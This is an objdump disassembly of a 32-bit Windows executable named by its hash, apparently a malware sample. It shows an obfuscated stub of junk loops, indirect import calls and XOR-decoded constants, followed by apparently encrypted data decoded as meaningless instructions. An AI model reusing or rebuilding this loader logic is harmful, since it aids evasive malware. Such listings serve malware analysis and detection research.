
1f45490de5a0c47cb6daad65e6371bf65565b14b3d427b01c33022d011266b64.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x90
  401009:	push   esi
  40100a:	and    DWORD PTR ds:0x42a010,0x0
  401014:	jmp    0x401024
  401019:	mov    eax,ds:0x42a010
  40101e:	inc    eax
  40101f:	mov    ds:0x42a010,eax
  401024:	cmp    DWORD PTR ds:0x42a010,0x1d
  40102b:	jae    0x401072
  401031:	cmp    DWORD PTR ds:0x42a010,0xc
  401038:	jne    0x40104c
  40103e:	push   0x42900c
  401043:	push   DWORD PTR [ebp-0x18]
  401046:	call   DWORD PTR ds:0x424014
  40104c:	cmp    DWORD PTR ds:0x42a010,0xb
  401053:	jne    0x401067
  401059:	xor    eax,eax
  40105b:	xor    eax,DWORD PTR ds:0x42a010
  401061:	inc    eax
  401062:	mov    ds:0x42a010,eax
  401067:	jmp    0x401019
  40106c:	adc    ecx,0xcd5
  401072:	push   edi
  401073:	mov    DWORD PTR ds:0x42b004,0x1e
  40107d:	cmp    DWORD PTR ds:0x42b004,0x0
  401084:	je     0x4010e3
  40108a:	cmp    DWORD PTR ds:0x42b004,0x2b
  401091:	jne    0x4010bf
  401097:	push   DWORD PTR [ebp-0x10]
  40109a:	push   0x42b010
  40109f:	push   0x2447
  4010a4:	push   0x42b00c
  4010a9:	push   0x8949
  4010ae:	push   DWORD PTR [ebp-0x14]
  4010b1:	push   DWORD PTR [ebp-0x10]
  4010b4:	push   0x13a5
  4010b9:	call   DWORD PTR ds:0x424018
  4010bf:	xor    esi,esi
  4010c1:	or     esi,DWORD PTR ds:0x42b004
  4010c7:	dec    esi
  4010c8:	mov    DWORD PTR ds:0x42b004,esi
  4010ce:	jmp    0x40107d
  4010d3:	mov    eax,ds:0x42a004
  4010d8:	adc    eax,DWORD PTR ds:0x42b00c
  4010de:	mov    ds:0x42a004,eax
  4010e3:	mov    eax,ds:0x421c66
  4010e8:	mov    DWORD PTR [ebp-0x2c],eax
  4010eb:	and    DWORD PTR ds:0x428010,0x0
  4010f5:	mov    ecx,DWORD PTR ds:0x428010
  4010fb:	inc    ecx
  4010fc:	mov    DWORD PTR ds:0x428010,ecx
  401102:	cmp    DWORD PTR ds:0x428010,0x2d
  401109:	jne    0x401118
  40110f:	push   DWORD PTR [ebp-0xc]
  401112:	call   DWORD PTR ds:0x42401c
  401118:	cmp    DWORD PTR ds:0x428010,0x1f
  40111f:	jb     0x4010f5
  401125:	mov    eax,ds:0x421d72
  40112a:	and    DWORD PTR ds:0x42b008,ebx
  401130:	mov    DWORD PTR [ebp-0x3c],eax
  401133:	sbb    DWORD PTR ds:0x42b010,ebx
  401139:	and    DWORD PTR [ebp-0x34],0x0
  40113d:	or     eax,0x2114
  401142:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  401149:	xor    eax,eax
  40114b:	or     eax,DWORD PTR ds:0x429008
  401151:	xor    DWORD PTR ds:0x428008,eax
  401157:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40115e:	mov    eax,DWORD PTR [ebp-0x1c]
  401161:	add    edi,DWORD PTR ds:0x429008
  401167:	mov    ecx,DWORD PTR [ebp-0x1c]
  40116a:	add    edi,esi
  40116c:	xor    eax,ecx
  40116e:	add    DWORD PTR ds:0x428024,edx
  401174:	mov    DWORD PTR [ebp-0x1c],eax
  401177:	and    DWORD PTR ds:0x42c000,0x0
  401181:	xor    eax,eax
  401183:	or     eax,DWORD PTR ds:0x42c000
  401189:	inc    eax
  40118a:	mov    ds:0x42c000,eax
  40118f:	cmp    DWORD PTR ds:0x42c000,0x19
  401196:	jne    0x4011a8
  40119c:	push   DWORD PTR [ebp-0x1c]
  40119f:	push   DWORD PTR [ebp-0xc]
  4011a2:	call   DWORD PTR ds:0x424020
  4011a8:	cmp    DWORD PTR ds:0x42c000,0x14
  4011af:	jb     0x401181
  4011b5:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  4011bc:	xor    DWORD PTR ds:0x428014,0x3e14
  4011c6:	mov    eax,DWORD PTR [ebp-0x28]
  4011c9:	sbb    edi,ecx
  4011cb:	mov    ecx,DWORD PTR [ebp-0x28]
  4011ce:	and    DWORD PTR ds:0x42a008,0x0
  4011d8:	mov    esi,DWORD PTR ds:0x42a008
  4011de:	inc    esi
  4011df:	mov    DWORD PTR ds:0x42a008,esi
  4011e5:	cmp    DWORD PTR ds:0x42a008,0x7
  4011ec:	jne    0x40121a
  4011f2:	push   0x42b018
  4011f7:	push   0x2bd6
  4011fc:	push   DWORD PTR [ebp-0x14]
  4011ff:	push   0x428004
  401204:	push   DWORD PTR [ebp-0x20]
  401207:	push   0x4237f2
  40120c:	push   0x1e5d
  401211:	push   DWORD PTR [ebp-0x28]
  401214:	call   DWORD PTR ds:0x424024
  40121a:	cmp    DWORD PTR ds:0x42a008,0x6
  401221:	jne    0x401234
  401227:	mov    esi,DWORD PTR ds:0x42a008
  40122d:	inc    esi
  40122e:	mov    DWORD PTR ds:0x42a008,esi
  401234:	cmp    DWORD PTR ds:0x42a008,0x16
  40123b:	jb     0x4011d8
  401241:	sub    DWORD PTR ds:0x42c00c,0x2ac6
  40124b:	xor    eax,ecx
  40124d:	dec    ecx
  40124e:	mov    DWORD PTR [ebp-0x28],eax
  401251:	and    DWORD PTR ds:0x428018,0x0
  40125b:	jmp    0x40126d
  401260:	mov    edi,DWORD PTR ds:0x428018
  401266:	inc    edi
  401267:	mov    DWORD PTR ds:0x428018,edi
  40126d:	cmp    DWORD PTR ds:0x428018,0x1f
  401274:	jae    0x4012b7
  40127a:	cmp    DWORD PTR ds:0x428018,0x11
  401281:	jne    0x401298
  401287:	push   0x4738
  40128c:	push   DWORD PTR [ebp-0x10]
  40128f:	push   DWORD PTR [ebp-0x24]
  401292:	call   DWORD PTR ds:0x424028
  401298:	cmp    DWORD PTR ds:0x428018,0x10
  40129f:	jne    0x4012b2
  4012a5:	mov    edi,DWORD PTR ds:0x428018
  4012ab:	inc    edi
  4012ac:	mov    DWORD PTR ds:0x428018,edi
  4012b2:	jmp    0x401260
  4012b7:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4012be:	mov    eax,DWORD PTR [ebp-0x18]
  4012c1:	and    DWORD PTR ds:0x428020,0x0
  4012cb:	mov    ecx,DWORD PTR ds:0x428020
  4012d1:	inc    ecx
  4012d2:	mov    DWORD PTR ds:0x428020,ecx
  4012d8:	cmp    DWORD PTR ds:0x428020,0x15
  4012df:	jne    0x4012f5
  4012e5:	push   0x4238b9
  4012ea:	push   0x42393d
  4012ef:	call   DWORD PTR ds:0x424030
  4012f5:	cmp    DWORD PTR ds:0x428020,0x14
  4012fc:	jb     0x4012cb
  401302:	mov    ecx,DWORD PTR [ebp-0x18]
  401305:	and    DWORD PTR ds:0x42b000,0x0
  40130f:	jmp    0x401321
  401314:	mov    edi,DWORD PTR ds:0x42b000
  40131a:	inc    edi
  40131b:	mov    DWORD PTR ds:0x42b000,edi
  401321:	cmp    DWORD PTR ds:0x42b000,0x19
  401328:	jae    0x401378
  40132e:	cmp    DWORD PTR ds:0x42b000,0xa
  401335:	jne    0x401359
  40133b:	push   DWORD PTR [ebp-0x18]
  40133e:	push   0x3609
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   DWORD PTR [ebp-0x18]
  401349:	push   0x6b70
  40134e:	push   0x42901c
  401353:	call   DWORD PTR ds:0x424038
  401359:	cmp    DWORD PTR ds:0x42b000,0x9
  401360:	jne    0x401373
  401366:	mov    edi,DWORD PTR ds:0x42b000
  40136c:	inc    edi
  40136d:	mov    DWORD PTR ds:0x42b000,edi
  401373:	jmp    0x401314
  401378:	xor    eax,ecx
  40137a:	mov    DWORD PTR [ebp-0x18],eax
  40137d:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  401384:	mov    eax,DWORD PTR [ebp-0x24]
  401387:	mov    ecx,DWORD PTR [ebp-0x24]
  40138a:	xor    eax,ecx
  40138c:	mov    DWORD PTR [ebp-0x24],eax
  40138f:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  401396:	mov    eax,DWORD PTR [ebp-0x14]
  401399:	mov    ecx,DWORD PTR [ebp-0x14]
  40139c:	xor    eax,ecx
  40139e:	mov    DWORD PTR [ebp-0x14],eax
  4013a1:	mov    eax,DWORD PTR [ebp-0x20]
  4013a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4013a7:	mov    esi,0x7510893
  4013ac:	xor    eax,esi
  4013ae:	mov    edi,0x3272db
  4013b3:	add    eax,edi
  4013b5:	xor    eax,ecx
  4013b7:	mov    DWORD PTR [ebp-0x14],eax
  4013ba:	mov    eax,DWORD PTR [ebp-0x10]
  4013bd:	mov    ecx,DWORD PTR [ebp-0x10]
  4013c0:	sub    eax,ecx
  4013c2:	mov    DWORD PTR [ebp-0x10],eax
  4013c5:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4013cc:	mov    al,BYTE PTR [ebp-0x1]
  4013cf:	movzx  ecx,BYTE PTR [ebp-0x1]
  4013d3:	movzx  eax,al
  4013d6:	sub    ecx,eax
  4013d8:	mov    BYTE PTR [ebp-0x1],cl
  4013db:	movzx  eax,BYTE PTR [ebp-0x1]
  4013df:	xor    eax,0xffffff99
  4013e2:	mov    BYTE PTR [ebp-0x1],al
  4013e5:	mov    eax,DWORD PTR [ebp-0x20]
  4013e8:	xor    eax,esi
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0x14],eax
  4013ef:	lea    eax,[ebp-0x40]
  4013f2:	mov    DWORD PTR [ebp-0x38],eax
  4013f5:	lea    eax,[ebp-0x38]
  4013f8:	mov    DWORD PTR [ebp-0x44],eax
  4013fb:	lea    eax,[ebp-0x44]
  4013fe:	mov    DWORD PTR [ebp-0x8],eax
  401401:	lea    eax,[ebp-0x8]
  401404:	mov    DWORD PTR [ebp-0x48],eax
  401407:	mov    eax,DWORD PTR [ebp-0x18]
  40140a:	xor    eax,esi
  40140c:	add    eax,edi
  40140e:	push   eax
  40140f:	mov    eax,DWORD PTR [ebp-0x1c]
  401412:	xor    eax,esi
  401414:	add    eax,edi
  401416:	push   eax
  401417:	mov    eax,DWORD PTR [ebp-0x10]
  40141a:	xor    eax,esi
  40141c:	add    eax,edi
  40141e:	push   eax
  40141f:	lea    eax,[ebp-0x90]
  401425:	push   eax
  401426:	push   DWORD PTR [ebp-0x20]
  401429:	push   DWORD PTR [ebp-0x30]
  40142c:	jmp    0x4037ee
  401431:	mov    al,0x4c
  401433:	cmp    BYTE PTR [edx+0x44b086b4],cl
  401439:	ss ins DWORD PTR es:[edi],dx
  40143b:	dec    edi
  40143c:	clc    
  40143d:	out    0x85,al
  40143f:	fucomi st,st(0)
  401441:	bound  esp,QWORD PTR [edx+0x62]
  401444:	(bad)  
  401445:	fstp   QWORD PTR [edi+0x62]
  401448:	bound  ecx,QWORD PTR [ecx]
  40144a:	sub    DWORD PTR [edi],eax
  40144c:	pop    eax
  40144d:	add    eax,0x792e0358
  401452:	pop    ebx
  401453:	jne    0x40149a
  401455:	lea    esp,[ecx]
  401457:	jb     0x40149b
  401459:	jno    0x401482
  40145b:	into   
  40145c:	push   eax
  40145d:	hlt    
  40145e:	and    al,0xd4
  401460:	xchg   ecx,eax
  401461:	fbstp  TBYTE PTR ds:0x1153c2c8
  401467:	icebp  
  401468:	aaa    
  401469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40146a:	add    DWORD PTR [edx-0x9],ebx
  40146d:	mov    al,ds:0xb465e64e
  401472:	in     al,dx
  401473:	(bad)  
  401474:	pop    eax
  401475:	cmp    esi,esi
  401477:	pushf  
  401478:	mov    ds:0x6b01003,eax
  40147d:	add    DWORD PTR [ebx-0x153fb6cb],0xa
  401484:	(bad)  
  401485:	scas   al,BYTE PTR es:[edi]
  401486:	sahf   
  401487:	test   eax,0x86999f74
  40148c:	js     0x4014a2
  40148e:	iret   
  40148f:	mov    edx,0xac6df4d7
  401494:	test   eax,0xdc9e713b
  401499:	xlat   BYTE PTR ds:[ebx]
  40149a:	rcr    BYTE PTR [esi+ebp*4+0x44a3fedb],0xc2
  4014a2:	aam    0x3
  4014a4:	dec    ebx
  4014a5:	std    
  4014a6:	mov    al,0x60
  4014a8:	in     eax,dx
  4014a9:	fbstp  TBYTE PTR [edx+0x7a8c4260]
  4014af:	push   ds
  4014b0:	pusha  
  4014b1:	stc    
  4014b2:	mov    al,ds:0x958913e5
  4014b7:	cmp    eax,0x95de469d
  4014bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014bd:	loope  0x4014a5
  4014bf:	ret    0xfb84
  4014c2:	push   ecx
  4014c3:	sub    eax,0x8f09f6d7
  4014c8:	(bad)  
  4014c9:	jmp    0x36a88a81
  4014ce:	pop    eax
  4014cf:	or     cl,dh
  4014d1:	inc    edx
  4014d2:	ins    BYTE PTR es:[edi],dx
  4014d3:	stos   BYTE PTR es:[edi],al
  4014d4:	cdq    
  4014d5:	aad    0x77
  4014d7:	dec    edi
  4014d8:	pop    edi
  4014d9:	xor    DWORD PTR [ebp-0x3051591a],edx
  4014df:	test   eax,0x67fbb6c2
  4014e4:	mov    edx,0x53fb3792
  4014e9:	rcr    BYTE PTR [ecx],cl
  4014eb:	out    dx,al
  4014ec:	pop    edx
  4014ed:	idiv   dl
  4014ef:	xor    al,cl
  4014f1:	lods   al,BYTE PTR ds:[esi]
  4014f2:	inc    esi
  4014f3:	xor    DWORD PTR [ecx+edi*4+0x13356d7f],ecx
  4014fa:	cmc    
  4014fb:	jne    0x4014ab
  4014fd:	push   cs
  4014fe:	push   0x3f96bf88
  401503:	xchg   edx,eax
  401504:	xor    DWORD PTR [ecx],eax
  401506:	fst    DWORD PTR [eax]
  401508:	mov    cl,0x88
  40150a:	mov    ds:0xe2a5fd00,al
  40150f:	outs   dx,DWORD PTR ds:[esi]
  401510:	pop    edi
  401511:	dec    ecx
  401512:	test   BYTE PTR [esi],ch
  401514:	push   es
  401515:	dec    esi
  401516:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401517:	sbb    al,0x6a
  401519:	scas   eax,DWORD PTR es:[edi]
  40151a:	jge    0x4014df
  40151c:	jmp    0xb07e3081
  401521:	ds dec esi
  401523:	push   es
  401524:	(bad)  
  401525:	jge    0x4015a6
  401527:	mov    BYTE PTR [esi-0x4b],dl
  40152a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40152b:	adc    BYTE PTR [ecx-0x62],0xd7
  40152f:	or     al,0x4e
  401531:	int3   
  401532:	inc    edi
  401533:	mov    edi,0xa360e931
  401538:	out    dx,eax
  401539:	inc    esi
  40153a:	imul   esi,DWORD PTR [esi-0x60],0xfa2a151f
  401541:	arpl   WORD PTR [ecx+ebx*2+0x387f1c6e],cx
  401548:	out    dx,al
  401549:	xchg   edx,eax
  40154a:	dec    ebp
  40154b:	idiv   BYTE PTR [edx]
  40154d:	js     0x4014d5
  40154f:	(bad)  
  401551:	ror    DWORD PTR [ecx+0x13],0xc1
  401555:	div    BYTE PTR ds:0x348a05ab
  40155b:	int    0x21
  40155d:	pop    ss
  40155e:	das    
  40155f:	repnz popf 
  401561:	dec    edx
  401562:	jle    0x40151f
  401564:	xor    eax,0x22c409b1
  401569:	lds    edx,FWORD PTR cs:[ebx+0x55]
  40156d:	fxch   st(7)
  40156f:	dec    ecx
  401570:	mov    ecx,0x1d837fa
  401575:	push   esi
  401576:	push   ecx
  401577:	inc    ecx
  401578:	in     eax,dx
  401579:	push   ecx
  40157a:	sbb    DWORD PTR [edx+0x34],esi
  40157d:	inc    ebx
  40157e:	cmp    DWORD PTR [ecx],esp
  401580:	push   edi
  401581:	mov    dl,0x50
  401583:	(bad)  
  401585:	aad    0x81
  401587:	les    eax,FWORD PTR [ebx-0x3413943]
  40158d:	lods   al,BYTE PTR ds:[esi]
  40158e:	adc    eax,0x7c6d6891
  401593:	leave  
  401594:	cmp    ecx,edx
  401596:	out    dx,eax
  401597:	sahf   
  401598:	ja     0x4015d5
  40159a:	adc    bh,dl
  40159c:	xor    ebp,ecx
  40159e:	cld    
  40159f:	sbb    al,0x35
  4015a1:	sbb    eax,0xae404b05
  4015a6:	jbe    0x4015c8
  4015a8:	fcomp  QWORD PTR [edx-0x60b1dc8c]
  4015ae:	adc    dh,bl
  4015b0:	add    DWORD PTR [eax+0x13],ebx
  4015b3:	dec    eax
  4015b4:	dec    ebx
  4015b5:	push   0xfb8b7339
  4015ba:	dec    ebp
  4015bb:	push   ds
  4015bc:	jg     0x401590
  4015be:	adc    eax,0x8a216414
  4015c3:	cmc    
  4015c4:	ins    BYTE PTR es:[edi],dx
  4015c5:	shr    dh,0xd
  4015c8:	(bad)  
  4015c9:	in     al,dx
  4015ca:	rcl    DWORD PTR ds:0xdf7bc95e,0xe7
  4015d1:	dec    esi
  4015d2:	mov    cl,bl
  4015d4:	shl    DWORD PTR [edx+eiz*8],1
  4015d7:	lds    ecx,FWORD PTR [edi]
  4015d9:	jecxz  0x401653
  4015db:	and    BYTE PTR [eax+0x3842d65],bh
  4015e1:	stc    
  4015e2:	push   esp
  4015e3:	mov    ebx,0x73b59aa4
  4015e8:	xor    BYTE PTR [edi],ah
  4015ea:	call   0x1eae:0x708574e2
  4015f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015f2:	mov    bl,0x66
  4015f4:	fisttp QWORD PTR [edi+0x57b97c39]
  4015fa:	(bad)  
  4015fb:	xor    BYTE PTR [edx],dh
  4015fd:	dec    edi
  4015fe:	jl     0x401615
  401600:	adc    al,0xc6
  401602:	cmp    BYTE PTR ds:0x99b050aa,ah
  401608:	push   0xffffffed
  40160a:	mov    ds:0xbeafdad8,al
  40160f:	in     eax,0xd1
  401611:	mov    bh,0xf3
  401613:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401614:	daa    
  401615:	pushf  
  401616:	jge    0x401611
  401618:	(bad)  [ebx-0x5094ff4c]
  40161e:	shr    DWORD PTR ds:0xa37e005a,0xf5
  401625:	arpl   WORD PTR [ebx-0x62],ax
  401628:	cli    
  401629:	daa    
  40162a:	in     al,0xdc
  40162c:	call   0xbfd4:0x8e15f659
  401633:	sub    eax,0xa8fed79a
  401638:	mov    edx,0xf5ec5a9c
  40163d:	cmp    al,0x14
  40163f:	cmp    eax,DWORD PTR [eax+0x66]
  401642:	jbe    0x40166a
  401644:	idiv   DWORD PTR es:[eax+0x69]
  401648:	jns    0x40164e
  40164a:	add    ch,BYTE PTR [edi+0x5c9cdeb1]
  401650:	sub    bh,BYTE PTR [edi-0x43107e6a]
  401656:	or     al,0x77
  401658:	xchg   BYTE PTR [ebx+edi*8],al
  40165b:	or     dh,dh
  40165d:	lahf   
  40165e:	xchg   esi,eax
  40165f:	xchg   esi,eax
  401660:	outs   dx,DWORD PTR ds:[esi]
  401661:	mov    DWORD PTR [edx+0x30],0xe8235f26
  401668:	cld    
  401669:	stos   BYTE PTR es:[edi],al
  40166a:	jg     0x40167b
  40166c:	and    eax,0xaa54bd27
  401671:	ret    
  401672:	pop    eax
  401673:	sbb    al,0x58
  401675:	sub    eax,0x6f44bc80
  40167a:	add    bh,bl
  40167c:	lds    edx,FWORD PTR [edx]
  40167e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40167f:	gs jmp 0x4ff7:0x6aa1f5ac
  401687:	xor    edi,DWORD PTR [esi]
  401689:	gs sahf 
  40168b:	mov    al,ds:0x3a754c21
  401690:	or     bh,BYTE PTR [esi-0x1a]
  401693:	icebp  
  401694:	ins    BYTE PTR es:[edi],dx
  401695:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401696:	jecxz  0x401654
  401698:	push   ss
  401699:	mov    ecx,0xf4bd7015
  40169e:	inc    esi
  40169f:	in     eax,dx
  4016a0:	sbb    DWORD PTR [edx+0x522d635f],edi
  4016a6:	sbb    eax,0xacc8efc
  4016ac:	mov    ds:0x7459cf68,eax
  4016b1:	jge    0x401652
  4016b3:	pop    edi
  4016b4:	mov    ebp,DWORD PTR [esi-0x35]
  4016b7:	call   0x37f:0xf2568ecb
  4016be:	push   ecx
  4016bf:	add    DWORD PTR [ebp+0x5a],ebx
  4016c2:	or     eax,0xed13c085
  4016c7:	(bad)  
  4016c8:	cmp    eax,0x5cdfc802
  4016cd:	call   0x2d85:0x398f102
  4016d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016d5:	jnp    0x40165c
  4016d7:	ret    0x24e5
  4016da:	sub    al,al
  4016dc:	mov    edi,0xc8c0edce
  4016e1:	je     0x401726
  4016e3:	and    ecx,DWORD PTR [esp+ebp*1-0x28]
  4016e7:	mov    esi,0xa043a275
  4016ec:	mov    cl,0x2
  4016ee:	daa    
  4016ef:	pop    ds
  4016f0:	cli    
  4016f1:	imul   eax,eax,0xf6388391
  4016f7:	push   edi
  4016f8:	xor    DWORD PTR [ebx],eax
  4016fa:	fs call 0x5e30:0xdafc6708
  401702:	pop    ds
  401703:	arpl   WORD PTR [edi],bp
  401705:	jg     0x4016b2
  401707:	xor    al,0x74
  401709:	in     eax,0x2f
  40170b:	or     DWORD PTR [ecx+0x18cdffbe],0x910b0229
  401715:	sub    bh,BYTE PTR [edx-0x35]
  401718:	mov    bh,0x6d
  40171a:	or     al,0x15
  40171c:	pop    esp
  40171d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40171e:	push   ebp
  40171f:	in     eax,dx
  401720:	imul   BYTE PTR ds:0xa7cccc74
  401726:	sub    al,0x4a
  401728:	mov    dl,0x43
  40172a:	fnstsw WORD PTR [esi+0x25]
  40172d:	fst    st(0)
  40172f:	mov    dl,0x1a
  401731:	add    BYTE PTR [edx],cl
  401733:	jmp    0xf27d:0x2ea71533
  40173a:	mov    cl,0x6
  40173c:	mov    dl,BYTE PTR [ebx]
  40173e:	enter  0x87b3,0xe5
  401742:	jp     0x401707
  401744:	sbb    BYTE PTR [ebp-0x3c427b64],ch
  40174a:	ror    DWORD PTR [ebp-0x4b],1
  40174d:	dec    edx
  40174e:	adc    al,0xaf
  401750:	push   0xa5804ccf
  401755:	das    
  401756:	inc    ebp
  401757:	loope  0x4017d1
  401759:	into   
  40175a:	pop    edi
  40175b:	push   0x34
  40175d:	mov    edi,DWORD PTR [eax-0x3c]
  401760:	mov    db7,esi
  401763:	pop    edi
  401764:	mov    edx,0xf6521541
  401769:	xchg   esi,eax
  40176a:	dec    DWORD PTR [eax]
  40176c:	das    
  40176d:	xchg   esp,eax
  40176e:	add    esp,DWORD PTR [eax]
  401770:	lock inc ecx
  401772:	push   edx
  401773:	jns    0x401767
  401775:	(bad)  
  401776:	pop    esp
  401777:	mov    ebx,0x63a27c83
  40177c:	popa   
  40177d:	(bad)  
  40177e:	mov    ds:0xd6587565,al
  401783:	cwde   
  401784:	out    0x89,al
  401786:	inc    edx
  401787:	push   edi
  401788:	sub    bl,BYTE PTR [ebp+0x77]
  40178b:	inc    ebp
  40178c:	inc    edi
  40178d:	or     al,0xed
  40178f:	lea    ebx,[ebx]
  401791:	daa    
  401792:	sbb    eax,0xf36214db
  401797:	cmp    DWORD PTR [ebp-0x24],ebx
  40179a:	xor    edx,DWORD PTR [edx-0x3f]
  40179d:	and    DWORD PTR [edx],0xfffffff7
  4017a0:	xchg   esi,eax
  4017a1:	mov    bl,0xa
  4017a3:	icebp  
  4017a4:	imul   edx,DWORD PTR [ebp-0x3c],0x5c
  4017a8:	and    BYTE PTR ds:[ebp-0x4],dh
  4017ac:	add    al,0x94
  4017ae:	jae    0x40173f
  4017b0:	xchg   esp,eax
  4017b1:	mov    DWORD PTR [eax-0x17],edi
  4017b4:	das    
  4017b5:	shl    DWORD PTR [edi-0x12f23979],cl
  4017bb:	test   BYTE PTR [ebx-0x90649b0],dh
  4017c1:	adc    bh,BYTE PTR [ebp-0x1]
  4017c4:	icebp  
  4017c5:	and    al,0x3e
  4017c7:	sub    eax,DWORD PTR ds:0xfad0439f
  4017cd:	enter  0xa28d,0x5d
  4017d1:	fs in  al,dx
  4017d3:	sahf   
  4017d4:	outs   dx,DWORD PTR ds:[esi]
  4017d5:	ficom  DWORD PTR [edx]
  4017d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017d8:	jg     0x401820
  4017da:	out    0x5b,al
  4017dc:	push   ebx
  4017dd:	stos   DWORD PTR es:[edi],eax
  4017de:	fild   DWORD PTR [ebp+eax*2+0x24]
  4017e2:	or     eax,0x4a3c71c8
  4017e7:	or     eax,0x330cba7c
  4017ec:	and    al,0x88
  4017ee:	mov    esi,0xe8a3aeda
  4017f3:	pushf  
  4017f4:	outs   dx,DWORD PTR ds:[si]
  4017f6:	jecxz  0x4017ca
  4017f8:	or     BYTE PTR [edx+ebp*4-0x58],dh
  4017fc:	outs   dx,DWORD PTR ds:[esi]
  4017fd:	lods   eax,DWORD PTR ds:[esi]
  4017fe:	stc    
  4017ff:	stos   DWORD PTR es:[edi],eax
  401800:	pop    edx
  401801:	push   0xa5065133
  401806:	push   ds
  401807:	cmp    DWORD PTR [esp+edx*2],ebp
  40180a:	popf   
  40180b:	pusha  
  40180c:	push   esp
  40180d:	lea    esp,[esi-0x10]
  401810:	mov    ds:0xc2f9ebae,eax
  401815:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401816:	push   ecx
  401817:	iret   
  401818:	push   ebx
  401819:	xchg   edi,eax
  40181a:	dec    edi
  40181b:	dec    esp
  40181c:	mov    al,ch
  40181e:	push   es
  40181f:	out    0x23,al
  401821:	ds dec ebp
  401823:	outs   dx,BYTE PTR ds:[esi]
  401824:	dec    ebx
  401825:	mov    ebp,DWORD PTR ss:[eax+0x372262fb]
  40182c:	test   eax,0xf0e6b6e4
  401831:	or     BYTE PTR [ebp+0x1c414f6b],bh
  401837:	ss push 0xe01344b3
  40183d:	inc    ecx
  40183e:	mov    dh,0x6f
  401840:	add    esi,ecx
  401842:	or     eax,0x98ce7a3c
  401847:	or     al,0xd6
  401849:	sub    BYTE PTR [esi+esi*4+0x5ec2e2f0],bl
  401850:	fucompp 
  401852:	xchg   edi,ebp
  401854:	jns    0x40180e
  401856:	lds    ecx,FWORD PTR [eax-0x6d]
  401859:	dec    ebp
  40185a:	(bad)  
  40185b:	dec    ebx
  40185c:	mov    DWORD PTR [edi],ecx
  40185e:	mov    eax,ds:0x2064b69b
  401863:	or     BYTE PTR [ecx+0x5fcc4962],al
  401869:	add    al,BYTE PTR [ebp+0x1410ce01]
  40186f:	pop    edx
  401870:	adc    ebp,DWORD PTR [eax]
  401872:	rol    DWORD PTR [ebx-0x6794eb20],0x44
  401879:	leave  
  40187a:	xchg   ebp,eax
  40187b:	inc    esp
  40187c:	add    eax,0xfc7171e4
  401881:	ret    
  401882:	add    BYTE PTR [eax-0x220c724],ch
  401888:	push   ecx
  401889:	sbb    ch,0x9d
  40188c:	outs   dx,DWORD PTR ds:[esi]
  40188d:	push   eax
  40188e:	cld    
  40188f:	sti    
  401890:	add    al,0xe2
  401892:	mov    edi,0x52b6fe50
  401897:	add    al,0x45
  401899:	(bad)  
  40189a:	int3   
  40189b:	(bad)  
  40189c:	adc    BYTE PTR [ebp+0x1b128dd6],ch
  4018a2:	lea    esi,[ebx+0x40]
  4018a5:	mov    al,ds:0x5a9915bc
  4018aa:	jo     0x4018b2
  4018ac:	stos   BYTE PTR es:[edi],al
  4018ad:	jecxz  0x4018ee
  4018af:	mov    ch,0x54
  4018b1:	xor    al,0x57
  4018b3:	jmp    0x36c4eb87
  4018b8:	mov    dl,0xdd
  4018ba:	lock pop edx
  4018bc:	pop    esi
  4018bd:	cmp    BYTE PTR [ecx+ebx*4+0x105ea65],ch
  4018c4:	je     0x40186c
  4018c6:	push   0xffffffb8
  4018c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4018c9:	sub    BYTE PTR [ebp+0x10],ch
  4018cc:	bound  ecx,QWORD PTR [esi-0x5a56ac17]
  4018d2:	retf   
  4018d3:	inc    ebp
  4018d4:	xchg   eax,edi
  4018d6:	sbb    edx,DWORD PTR [ebx+0x35]
  4018d9:	cmp    BYTE PTR [eax-0x45],cl
  4018dc:	ret    0xf22d
  4018df:	push   ebp
  4018e0:	leave  
  4018e1:	scas   eax,DWORD PTR es:[edi]
  4018e2:	into   
  4018e3:	or     al,0x28
  4018e5:	gs pop esi
  4018e7:	cdq    
  4018e8:	cmp    esp,edx
  4018ea:	cmp    ebp,DWORD PTR [esi+0x4c78df2f]
  4018f0:	dec    edx
  4018f1:	push   ecx
  4018f2:	cld    
  4018f3:	ja     0x40191e
  4018f5:	std    
  4018f6:	xchg   edi,eax
  4018f7:	xchg   BYTE PTR [ebp+0x16b03811],ch
  4018fd:	inc    edx
  4018fe:	out    dx,eax
  4018ff:	pop    esi
  401900:	xor    eax,0xcc57e82e
  401905:	mov    edx,0xa07b07b1
  40190a:	jge    0x40189c
  40190c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40190d:	lahf   
  40190e:	adc    al,0x98
  401910:	aaa    
  401911:	sahf   
  401912:	and    BYTE PTR [edi-0x3e777b27],ah
  401918:	imul   edx,ecx,0x22cccfea
  40191e:	and    al,0xc8
  401920:	aam    0x33
  401922:	pop    edi
  401923:	add    edx,DWORD PTR [ebp+0x128ea9fd]
  401929:	cmp    al,0x12
  40192b:	aaa    
  40192c:	fnsave [edi+edx*1-0x196a018b]
  401933:	dec    ecx
  401934:	jae    0x401922
  401936:	xchg   edx,eax
  401937:	(bad)  
  401938:	jo     0x401924
  40193a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
